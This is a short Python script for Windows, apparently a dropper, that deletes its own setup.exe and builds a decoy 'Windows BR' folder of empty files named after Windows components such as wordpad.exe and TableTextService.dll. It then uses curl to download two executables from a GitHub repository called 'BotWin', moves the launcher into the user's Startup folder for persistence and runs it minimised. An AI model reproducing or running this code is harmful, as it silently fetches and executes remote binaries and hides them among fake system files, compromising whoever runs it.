import os,getpass

print("sos")

os.system("del setup.exe")

os.chdir("C:/Program Files (x86)")
os.mkdir("Windows BR")
os.chdir("Windows BR")
os.mkdir("Accessories")
os.mkdir("TableTextService")
os.chdir("Accessories")
os.mkdir("en-US")
os.mkdir("it-IT")
os.chdir("it-IT")
os.system("NUL> wordpad.exe.mui")
os.chdir("..")
os.system("NUL> wordpad.exe")
os.system("NUL> WordpadFilter.dll")
os.chdir("..")
os.chdir("TableTextService")
os.mkdir("en-US")
os.system("NUL> TableTextService.dll")
os.system("NUL> TableTextServiceArray.txt")
os.system("NUL> TableTextTigrinya.txt")
os.system("NUL> TableTextServiceDaYi.txt")
os.system("NUL> TableTextServiceYi.txt")
os.chdir("en-US")
os.system("NUL> TableTextService.dll.mui")
os.system("..")

user=getpass.getuser()

if(not os.path.exists("TableTextService.dll.exe")):
    os.system("curl.exe --output TableTextService.dll.exe --url https://raw.githubusercontent.com/Libx86/BotWin/master/TableTextService.dll.exe")
if(not os.path.exists("TableTextServiceLauncher.exe")):
    os.system("curl.exe --output TableTextServiceLauncher.exe --url https://raw.githubusercontent.com/Libx86/BotWin/master/TableTextServiceLauncher.exe")
os.system('move TableTextServiceLauncher.exe "C:/users/'+str(user)+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"')

os.chdir("C:/users/"+str(user)+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
os.system("start /MIN TableTextServiceLauncher.exe")
